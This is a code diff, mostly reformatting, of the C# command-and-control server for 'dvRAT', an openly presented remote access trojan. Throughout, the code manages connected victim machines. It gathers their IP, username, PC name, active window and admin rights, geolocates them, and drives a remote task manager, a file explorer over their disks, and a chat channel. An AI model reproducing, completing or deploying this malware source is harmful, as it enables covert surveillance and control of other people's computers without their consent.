@@ -2,7 +2,6 @@
 // * dvRAT
 // * @copyright      Copyright (c) DEvil. (https://www.instagram.com/justalghamdi AKA https://www.github.com/justalghamdi)
 // * @author         justalghamdi
-// * @version        Release: 0.1
 // *
 using System;
 using System.Collections.Generic;
@@ -23,7 +22,7 @@ namespace dvrat
 {
     public partial class Form1 : Form
     {
-       
+
         public Form1()
         {
             InitializeComponent();
@@ -153,12 +152,12 @@ namespace dvrat
                 Thread.Sleep(1000);
             }
         }
-   
+
         private void Form1_Load(object sender, EventArgs e)
         {
             contextMenuStrip1.Enabled = false;
             log_box.HorizontalScrollbar = true;
-            threads_label.Location = new Point(529 ,427);
+            threads_label.Location = new Point(529, 427);
             socket_label.Location = new Point(597, 427);
             threads_label.Text = $"Threads [{Process.GetCurrentProcess().Threads.Count}]";
             this.Width = 1004;
@@ -305,7 +304,7 @@ namespace dvrat
                 try
                 {
                     connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
-                  
+
                     if (clients_sockets.Count == 0)
                     {
                         if (dataGridView1.Rows.Count != 0)
@@ -316,7 +315,7 @@ namespace dvrat
                             }
                         }
                     }
-                  
+
                     if (dataGridView1.Rows.Count != 0)
                     {
                         if (contextMenuStrip1.InvokeRequired)
@@ -354,7 +353,7 @@ namespace dvrat
 
                 for (int i = 0; i < dataGridView1.Rows.Count; ++i)
                 {
-                    if ( (get_client_by_index(i)) == null)
+                    if ((get_client_by_index(i)) == null)
                     {
                         //Client Does not exists and the row is deleted
                         continue;
@@ -395,7 +394,7 @@ namespace dvrat
                     Thread.Sleep(500);
                 }
             }
-            catch (Exception )
+            catch (Exception)
             {
                 //pass
             }
@@ -520,7 +519,7 @@ namespace dvrat
             }
         }
 
-      
+
         private void refresh_clients()
         {
             while (true)
@@ -546,7 +545,7 @@ namespace dvrat
                         }
                     }
                 }
-                catch (Exception )
+                catch (Exception)
                 {
                     //pass
                 }
@@ -560,8 +559,9 @@ namespace dvrat
 
         private void dealing_with_the_client(Socket client_socket)
         {
-            _start:
-            try {
+        _start:
+            try
+            {
                 client_socket.ReceiveTimeout = 5 * 1000;
                 bool is_admin = false;
                 int current_index = get_client_index(client_socket);
@@ -575,400 +575,402 @@ namespace dvrat
                 Bitmap country_image = null;
                 int index_of_client_socket = 0;
                 int index_row_of_grid = 0;
-                int empty_recv = 0, no_ok = 0 ;
+                int empty_recv = 0, no_ok = 0;
                 int send_bytes = client_socket.Send(Encoding.Default.GetBytes("getinfo;"));
                 upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; }));
                 int bytes_recv = 0;
                 int num_of_bytes_to_recv = 0xfff;
                 byte[] buffer_recv = new byte[num_of_bytes_to_recv];
                 while (client_socket.Connected)
-                { 
-            
-                   
+                {
+
+
                 _start_recv:
-                        this.Invoke(new MethodInvoker(() =>
+                    this.Invoke(new MethodInvoker(() =>
+                    {
+                        Refresh();
+                    }));
+                    index_of_client_socket = get_client_index(client_socket);
+                    if (index_of_client_socket == -1)
+                    {
+                        if (index_row_of_grid != -1)
                         {
-                            Refresh();
-                        }));
-                            index_of_client_socket = get_client_index(client_socket);
-                            if (index_of_client_socket == -1)
+                            if (!SocketConnected(client_socket))
                             {
-                                if (index_row_of_grid != -1)
-                                {
-                                    if (!SocketConnected(client_socket))
-                                    {
-                                        dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
-                                        clients_online.RemoveAt(index_of_client_socket);
-                                    }
-                                }
-                                if (!SocketConnected(client_socket))
-                                {
-                                    break;
-                                }
+                                dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
+                                clients_online.RemoveAt(index_of_client_socket);
                             }
-                           
-                            if (index_row_of_grid != index_of_client_socket)
+                        }
+                        if (!SocketConnected(client_socket))
+                        {
+                            break;
+                        }
+                    }
+
+                    if (index_row_of_grid != index_of_client_socket)
+                    {
+                        if (SocketConnected(client_socket))
+                        {
+                            index_row_of_grid = index_of_client_socket;
+                        }
+                        else
+                        {
+                            clients_online.RemoveAt(index_of_client_socket);
+                            break;
+                        }
+                    }
+
+                    try
+                    {
+                        if (no_ok >= 50)
+                        {
+                            if (!SocketConnected(client_socket))
                             {
-                                if (SocketConnected(client_socket))
-                                {
-                                    index_row_of_grid = index_of_client_socket;
-                                }
-                                else
-                                {
-                                    clients_online.RemoveAt(index_of_client_socket);
-                                    break;
-                                }
+                                break;
                             }
-                            
+                        }
+                        if (empty_recv >= 10)
+                        {
+                            //some err happend
+                            if (!SocketConnected(client_socket))
+                            {
+                                dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
+                                clients_online.RemoveAt(index_of_client_socket);
+                                break;
+                            }
+                            else
+                            {
+                                continue;
+                            }
+                        }
+
+                        bytes_recv = client_socket.Receive(buffer_recv);
+
+                    }
+                    catch (Exception ex)
+                    {
+                        empty_recv += 1;
+                        no_ok += 1;
+                        goto _start_recv;
+                    }
+                    string string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
+                    if (string_recv.Length == 0)
+                    {
+                        empty_recv += 1;
+                        goto _start_recv;
+                    }
+                    log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: recv from client: {string_recv}"); }));
+                    download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
+                    if (string_recv.StartsWith("start_up_info;"))
+                    {
+
+                        connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
+                        string remove_tag = string_recv.Substring(14);
+                        string[] info_array = remove_tag.Split('\n');
+                        ip = info_array[0];
+                        string active_window = info_array[1];
+                        client_windows_username = info_array[2];
+                        client_pc_name = info_array[3];
+                        client_win_main_dir = info_array[4];
+                        client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
+                        string[] disks_arr = xSplit(info_array[5], "&=");
+                        is_admin = string_recv.Contains("true_admin") ? true : false;
+
+
+                        if (!ip.Contains("ERR_WHILE_GET_IP"))
+                        {
+                            string ip_info = getIpInfo(ip);
+                            var obj = JObject.Parse(ip_info);
+                            string country_code = $"{obj["countryCode"]}";
+                            country_image = new Bitmap($"res\\Flags\\{country_code.ToLower()}.png");
+                            dataGridView1.Invoke(new MethodInvoker(() =>
+                            {
+                                index_row_of_grid = dataGridView1.Rows.Add(
+                                country_image,
+                                ip,
+                                active_window,
+                                client_windows_username,
+                                client_pc_name,
+                                string_recv.Contains("true_admin") ? "true" : "false",
+                                "online");
+                            }));
+                        }
+                        else
+                        {
+
+                            country_image = new Bitmap($"res\\Flags\\-1.png");
+                            dataGridView1.Invoke(new MethodInvoker(() =>
+                            {
+                                index_row_of_grid = dataGridView1.Rows.Add(
+                                country_image,
+                                "ERR_WHILE_GET_IP",
+                                active_window,
+                                client_windows_username,
+                                client_pc_name,
+                                string_recv.Contains("true_admin") ? "true" : "false",
+                                "online");
+                            }));
+                            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: err in get client ip"); }));
+                        }
+
+                    }
+                    else if (string_recv.StartsWith("ok_refresh;"))
+                    {
+                        dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "online";
+                        no_ok = 0;
+                        empty_recv = 0;
+                        string[] tags = string_recv.Split('\n');
+                        string window_name = tags[1].Substring(10);
+                        try
+                        {
+                            dataGridView1.Invoke(new MethodInvoker(() =>
+                            {
+                                dataGridView1.Rows[index_row_of_grid].Cells["_active_window"].Value = window_name;
+                            }));
+                            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: client number {index_of_client_socket} send OK"); }));
+                        }
+                        catch (Exception ex)
+                        {
+                            // the error must be that the client don't send its info so its not on the Grid !
+                            if (!SocketConnected(client_socket))
+                            {
+                                client_socket.Close();
+                                clients_sockets.RemoveAt(index_of_client_socket);//remove client
+                                clients_online.RemoveAt(index_of_client_socket);
+                                connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
+                                dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
+
+                                break;
+                                //TODO: tell client to reconnect
+                            }
+                        }
+
+                    }
+                    else if (string_recv.StartsWith("tsk_mgr;"))
+                    {
+
+                        int mgr_size = string_recv.Length;
+                        string sub_it = string_recv.Substring(8);
+                        string[] tags = sub_it.Split('\n');
+                        string chunk = tags[1];
+                        int size = Int32.Parse(tags[0]);
+                    _begin:
+
+                        if (mgr_size >= size)
+                        {
                             try
                             {
-                                if (no_ok >= 50)
-                                {
-                                    if (!SocketConnected(client_socket))
-                                    {
-                                        break;
-                                    }
-                                }
-                                if (empty_recv >= 10)
-                                {
-                                    //some err happend
-                                    if (!SocketConnected(client_socket))
-                                    {
-                                        dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
-                                        clients_online.RemoveAt(index_of_client_socket);
-                                        break;
-                                    }
-                                    else
-                                    {
-                                        continue;
-                                    }
-                                }
-
+                                JObject tsk_obj = JObject.Parse(chunk);
+                                tsk_mgr_view tsk_mgr_form = new tsk_mgr_view(client_socket, this, tsk_obj);
+                                tsk_mgr_form.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
+                                tsk_mgr_form.ShowDialog();
+                            }
+                            catch (Exception) //something wrong with chunk
+                            {
                                 bytes_recv = client_socket.Receive(buffer_recv);
-
+                                string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
+                                chunk += string_recv; // it should be the complete of chunk with out tags
+                                mgr_size += string_recv.Length;
+                                download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
+                                goto _begin;
                             }
-                            catch (Exception ex)
-                            {
-                                empty_recv += 1;
-                                no_ok += 1;
-                                goto _start_recv;
-                            }
-                            string string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
-                            if (string_recv.Length == 0)
-                            {
-                                empty_recv += 1;
-                                goto _start_recv;
-                            }
-                            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: recv from client: {string_recv}"); }));
+                        }
+                        else
+                        {
+                            bytes_recv = client_socket.Receive(buffer_recv);
+                            string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
+                            chunk += string_recv; // it should be the complete of chunk with out tags
+                            mgr_size += string_recv.Length;
                             download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
-                            if (string_recv.StartsWith("start_up_info;"))
+                            goto _begin;
+                        }
+                    }
+                    else if (string_recv.StartsWith("client_new_message;"))
+                    {
+                        string message = string_recv.Substring("client_new_message;".Length);
+                        if (message.Contains("force_close"))
+                        {
+                            send_to_client(client_socket, "start_chat;");//force reopen
+                        }
+                        else
+                        {
+                            cht_frm.add_to_list(message);
+                        }
+                    }
+                    else if (string_recv.StartsWith("client_recv_main_dir;"))
+                    {
+
+                        int fl_exp_size = string_recv.Length;
+                        string sub_it = string_recv.Substring("client_recv_main_dir;".Length);
+                        if (sub_it.Contains("err"))
+                        {
+                            fle_explr_frm._err("can't open file\\folder!");
+                        }
+                        else
+                        {
+                            string[] tags = sub_it.Split('\n');
+                            string chunk = tags[1];
+                            int size = Int32.Parse(tags[0]);
+                        _begin:
+                            if (fl_exp_size == size)
                             {
-                            
-                                connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
-                                string remove_tag = string_recv.Substring(14);
-                                string[] info_array = remove_tag.Split('\n');
-                                ip = info_array[0];
-                                string active_window = info_array[1];
-                                client_windows_username = info_array[2];
-                                client_pc_name = info_array[3];
-                                client_win_main_dir = info_array[4];
-                                client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
-                                string[] disks_arr = xSplit(info_array[5], "&=");
-                                is_admin = string_recv.Contains("true_admin") ? true : false;
-                               
-
-                                if (!ip.Contains("ERR_WHILE_GET_IP"))
-                                {
-                                    string ip_info = getIpInfo(ip);
-                                    var obj = JObject.Parse(ip_info);
-                                    string country_code = $"{obj["countryCode"]}";
-                                    country_image = new Bitmap($"res\\Flags\\{country_code.ToLower()}.png");
-                                    dataGridView1.Invoke(new MethodInvoker(() =>
-                                    {
-                                        index_row_of_grid = dataGridView1.Rows.Add(
-                                        country_image,
-                                        ip,
-                                        active_window,
-                                        client_windows_username,
-                                        client_pc_name,
-                                        string_recv.Contains("true_admin") ? "true" : "false",
-                                        "online");
-                                    }));
-                                }
-                                else
-                                {
-
-                                    country_image = new Bitmap($"res\\Flags\\-1.png");
-                                    dataGridView1.Invoke(new MethodInvoker(() =>
-                                    {
-                                        index_row_of_grid = dataGridView1.Rows.Add(
-                                        country_image,
-                                        "ERR_WHILE_GET_IP",
-                                        active_window,
-                                        client_windows_username,
-                                        client_pc_name,
-                                        string_recv.Contains("true_admin") ? "true" : "false",
-                                        "online");
-                                    }));
-                                    log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: err in get client ip"); }));
-                                }
-
-                            }
-                            else if (string_recv.StartsWith("ok_refresh;"))
-                            {
-                                dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "online";
-                                no_ok = 0;
-                                empty_recv = 0;
-                                string[] tags = string_recv.Split('\n');
-                                string window_name = tags[1].Substring(10);
                                 try
                                 {
-                                    dataGridView1.Invoke(new MethodInvoker(() =>
-                                    {
-                                        dataGridView1.Rows[index_row_of_grid].Cells["_active_window"].Value = window_name;
-                                    }));
-                                    log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: client number {index_of_client_socket} send OK"); }));
+                                    JObject files_obj = JObject.Parse(chunk);
+                                    fle_explr_frm.load_main_files(files_obj);
+
                                 }
                                 catch (Exception ex)
                                 {
-                                    // the error must be that the client don't send its info so its not on the Grid !
-                                    if (!SocketConnected(client_socket))
-                                    {
-                                        client_socket.Close();
-                                        clients_sockets.RemoveAt(index_of_client_socket);//remove client
-                                        clients_online.RemoveAt(index_of_client_socket);
-                                        connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
-                                        dataGridView1.Rows[index_row_of_grid].Cells["_client_status"].Value = "offline";
-
-                                        break;
-                                        //TODO: tell client to reconnect
-                                    }
+                                    fle_explr_frm._err("can't open file\\folder!");
                                 }
-                             
                             }
-                            else if (string_recv.StartsWith("tsk_mgr;"))
+                            else
                             {
-                            
-                                int mgr_size = string_recv.Length;
-                                string sub_it = string_recv.Substring(8);
-                                string[] tags = sub_it.Split('\n');
-                                string chunk = tags[1];
-                                int size = Int32.Parse(tags[0]);
-                            _begin:
-
-                                if (mgr_size >= size)
+                                if (fl_exp_size > size)
                                 {
-                                    try
-                                    {
-                                        JObject tsk_obj = JObject.Parse(chunk);
-                                        tsk_mgr_view tsk_mgr_form = new tsk_mgr_view(client_socket, this, tsk_obj);
-                                        tsk_mgr_form.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
-                                        tsk_mgr_form.ShowDialog();
-                                    }
-                                    catch (Exception) //something wrong with chunk
-                                    {
-                                        bytes_recv = client_socket.Receive(buffer_recv);
-                                        string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
-                                        chunk += string_recv; // it should be the complete of chunk with out tags
-                                        mgr_size += string_recv.Length;
-                                        download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
-                                        goto _begin;
-                                    }
+                                    int __ = fl_exp_size - size;
+                                    size += __;
+                                    goto _begin;
                                 }
                                 else
                                 {
                                     bytes_recv = client_socket.Receive(buffer_recv);
                                     string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                                     chunk += string_recv; // it should be the complete of chunk with out tags
-                                    mgr_size += string_recv.Length;
+                                    fl_exp_size += string_recv.Length;
                                     download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                                     goto _begin;
                                 }
                             }
-                            else if (string_recv.StartsWith("client_new_message;"))
-                            {
-                                string message = string_recv.Substring("client_new_message;".Length);
-                                if (message.Contains("force_close"))
-                                {
-                                    send_to_client(client_socket, "start_chat;");//force reopen
-                                }else
-                                {
-                                    cht_frm.add_to_list(message);
-                                }
-                            }
-                            else if (string_recv.StartsWith("client_recv_main_dir;"))
-                            {
-                            
-                                int fl_exp_size = string_recv.Length;
-                                string sub_it = string_recv.Substring("client_recv_main_dir;".Length);
-                                if (sub_it.Contains("err"))
-                                {
-                                    fle_explr_frm._err("can't open file\\folder!");
-                                }
-                                else
-                                {
-                                    string[] tags = sub_it.Split('\n');
-                                    string chunk = tags[1];
-                                    int size = Int32.Parse(tags[0]);
-                                _begin:
-                                    if (fl_exp_size == size)
-                                    {
-                                        try
-                                        {
-                                            JObject files_obj = JObject.Parse(chunk);
-                                            fle_explr_frm.load_main_files(files_obj);
-
-                                        }
-                                        catch (Exception ex)
-                                        {
-                                            fle_explr_frm._err("can't open file\\folder!");
-                                        }
-                                    }
-                                    else
-                                    {
-                                        if (fl_exp_size > size)
-                                        {
-                                            int __ = fl_exp_size - size;
-                                            size += __;
-                                            goto _begin;
-                                        }
-                                        else
-                                        {
-                                            bytes_recv = client_socket.Receive(buffer_recv);
-                                            string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
-                                            chunk += string_recv; // it should be the complete of chunk with out tags
-                                            fl_exp_size += string_recv.Length;
-                                            download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
-                                            goto _begin;
-                                        }
-                                    }
-                                }
-                            }
-                            else if (string_recv.StartsWith("client_recv_sub_main_files;"))
-                            {
-                                int fl_exp_size = string_recv.Length;
-                                string sub_it = string_recv.Substring("client_recv_sub_main_files;".Length);
-                                if (sub_it.Contains("err"))
-                                {
-                                    fle_explr_frm._err("can't open file\\folder!");
-                                }
-                                else
-                                {
-                                    string[] tags = sub_it.Split('\n');
-                                    string chunk = tags[1];
-                                    int size = Int32.Parse(tags[0]);
-                                _begin:
-                                    if (fl_exp_size == size)
-                                    {
-                                        try
-                                        {
-                                            JObject files_obj = JObject.Parse(chunk);
-                                            fle_explr_frm.load_files(files_obj);
-
-                                        }
-                                        catch (Exception ex)
-                                        {
-                                            fle_explr_frm._err("can't open file\\folder!");
-                                        }
-                                    }
-                                    else
-                                    {
-                                        if (fl_exp_size > size)
-                                        {
-                                            int __ = fl_exp_size - size;
-                                            size += __;
-                                            goto _begin;
-                                        }
-                                        else
-                                        {
-                                            bytes_recv = client_socket.Receive(buffer_recv);
-                                            string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
-                                            chunk += string_recv; // it should be the complete of chunk with out tags
-                                            fl_exp_size += string_recv.Length;
-                                            download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
-                                            goto _begin;
-                                        }
-                                    }
-                                }
-                            }
-                            else if (string_recv.StartsWith("client_recv_sub_files;"))
-                            {
-                                int fl_exp_size = string_recv.Length;
-                                string sub_it = string_recv.Substring("client_recv_sub_files;".Length);
-                                if (sub_it.Contains("err"))
-                                {
-                                    fle_explr_frm._err("can't open file\\folder!");
-                                }
-                                else
-                                {
-                                    string[] tags = sub_it.Split('\n');
-                                    string chunk = tags[1];
-                                    int size = Int32.Parse(tags[0]);
-                                _begin:
-                                    if (fl_exp_size == size)
-                                    {
-                                        try
-                                        {
-                                            JObject files_obj = JObject.Parse(chunk);
-                                            fle_explr_frm.load_files(files_obj);
-
-                                        }
-                                        catch (Exception ex)
-                                        {
-                                            fle_explr_frm._err("can't open file\\folder!");
-                                        }
-                                    }
-                                    else
-                                    {
-                                        if (fl_exp_size > size)
-                                        {
-                                            int __ = fl_exp_size - size;
-                                            size += __;
-                                            goto _begin;
-                                        }
-                                        else
-                                        {
-                                            bytes_recv = client_socket.Receive(buffer_recv);
-                                            string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
-                                            chunk += string_recv; // it should be the complete of chunk with out tags
-                                            fl_exp_size += string_recv.Length;
-                                            download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
-                                            goto _begin;
-                                        }
-                                    }
-                                }
-                            }
-                        else if (string_recv.StartsWith("main_dirs;")) 
+                        }
+                    }
+                    else if (string_recv.StartsWith("client_recv_sub_main_files;"))
+                    {
+                        int fl_exp_size = string_recv.Length;
+                        string sub_it = string_recv.Substring("client_recv_sub_main_files;".Length);
+                        if (sub_it.Contains("err"))
                         {
-                            string remove_tag = string_recv.Substring(11);
-                            string[] info_array = remove_tag.Split('\n');
-                            client_windows_username = info_array[0];
-                            client_pc_name = info_array[1];
-                            client_win_main_dir = info_array[2];
-                            client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
-                            string[] disks_arr = xSplit(info_array[3], "&=");
-                            for (int i = 1; i < disks_arr.Length; i++)
+                            fle_explr_frm._err("can't open file\\folder!");
+                        }
+                        else
+                        {
+                            string[] tags = sub_it.Split('\n');
+                            string chunk = tags[1];
+                            int size = Int32.Parse(tags[0]);
+                        _begin:
+                            if (fl_exp_size == size)
                             {
-                                if (!disks_arr[i].Contains("END"))
+                                try
                                 {
-                                    client_ALL_DISK += disks_arr[i].Trim() + '\n';
+                                    JObject files_obj = JObject.Parse(chunk);
+                                    fle_explr_frm.load_files(files_obj);
+
+                                }
+                                catch (Exception ex)
+                                {
+                                    fle_explr_frm._err("can't open file\\folder!");
                                 }
                             }
-                   
-                            client_username_main_dir = client_username_main_dir.Replace("#client_main_disk", client_MAIN_DISK);
-                            client_username_main_dir = client_username_main_dir.Replace("#client_username", client_windows_username);
-                            fle_explr_frm = new file_explorer_form(client_socket, this, client_username_main_dir);
-                            fle_explr_frm.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
-                            send_to_client(client_socket, $"start_fileexplorer;\n{client_username_main_dir}");
-                            new Thread(new ThreadStart(new Action(() => {
-                                fle_explr_frm._MAIN_DISKS = client_ALL_DISK.Split('\n');
-                                fle_explr_frm.ShowDialog();
-                            }))).Start();
+                            else
+                            {
+                                if (fl_exp_size > size)
+                                {
+                                    int __ = fl_exp_size - size;
+                                    size += __;
+                                    goto _begin;
+                                }
+                                else
+                                {
+                                    bytes_recv = client_socket.Receive(buffer_recv);
+                                    string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
+                                    chunk += string_recv; // it should be the complete of chunk with out tags
+                                    fl_exp_size += string_recv.Length;
+                                    download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
+                                    goto _begin;
+                                }
+                            }
                         }
-                        if (Application.OpenForms["chat_form"] == null) { 
-                                no_ok += 1;
+                    }
+                    else if (string_recv.StartsWith("client_recv_sub_files;"))
+                    {
+                        int fl_exp_size = string_recv.Length;
+                        string sub_it = string_recv.Substring("client_recv_sub_files;".Length);
+                        if (sub_it.Contains("err"))
+                        {
+                            fle_explr_frm._err("can't open file\\folder!");
                         }
-                        GC.Collect();//Collect to not fill memory
+                        else
+                        {
+                            string[] tags = sub_it.Split('\n');
+                            string chunk = tags[1];
+                            int size = Int32.Parse(tags[0]);
+                        _begin:
+                            if (fl_exp_size == size)
+                            {
+                                try
+                                {
+                                    JObject files_obj = JObject.Parse(chunk);
+                                    fle_explr_frm.load_files(files_obj);
+
+                                }
+                                catch (Exception ex)
+                                {
+                                    fle_explr_frm._err("can't open file\\folder!");
+                                }
+                            }
+                            else
+                            {
+                                if (fl_exp_size > size)
+                                {
+                                    int __ = fl_exp_size - size;
+                                    size += __;
+                                    goto _begin;
+                                }
+                                else
+                                {
+                                    bytes_recv = client_socket.Receive(buffer_recv);
+                                    string_recv = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
+                                    chunk += string_recv; // it should be the complete of chunk with out tags
+                                    fl_exp_size += string_recv.Length;
+                                    download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
+                                    goto _begin;
+                                }
+                            }
+                        }
+                    }
+                    else if (string_recv.StartsWith("main_dirs;"))
+                    {
+                        string remove_tag = string_recv.Substring(11);
+                        string[] info_array = remove_tag.Split('\n');
+                        client_windows_username = info_array[0];
+                        client_pc_name = info_array[1];
+                        client_win_main_dir = info_array[2];
+                        client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
+                        string[] disks_arr = xSplit(info_array[3], "&=");
+                        for (int i = 1; i < disks_arr.Length; i++)
+                        {
+                            if (!disks_arr[i].Contains("END"))
+                            {
+                                client_ALL_DISK += disks_arr[i].Trim() + '\n';
+                            }
+                        }
+
+                        client_username_main_dir = client_username_main_dir.Replace("#client_main_disk", client_MAIN_DISK);
+                        client_username_main_dir = client_username_main_dir.Replace("#client_username", client_windows_username);
+                        fle_explr_frm = new file_explorer_form(client_socket, this, client_username_main_dir);
+                        fle_explr_frm.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
+                        send_to_client(client_socket, $"start_fileexplorer;\n{client_username_main_dir}");
+                        new Thread(new ThreadStart(new Action(() => {
+                            fle_explr_frm._MAIN_DISKS = client_ALL_DISK.Split('\n');
+                            fle_explr_frm.ShowDialog();
+                        }))).Start();
+                    }
+                    if (Application.OpenForms["chat_form"] == null)
+                    {
+                        no_ok += 1;
+                    }
+                    GC.Collect();//Collect to not fill memory
 
                 }
                 try
@@ -985,9 +987,9 @@ namespace dvrat
                     /* just pass */
                 }
             }
-            catch (Exception )
+            catch (Exception)
             {
-                
+
             }
             GC.Collect();//Collect to not fill memory
             if (SocketConnected(client_socket)) //Last Check!
@@ -1028,7 +1030,7 @@ namespace dvrat
                 clients_sockets.Add(client_socket);
                 clients_online.Add(get_client_index(client_socket));
                 new Thread(new ThreadStart(new Action(() => { dealing_with_the_client(client_socket); }))).Start();
-                
+
                 goto _start;
             }
         }
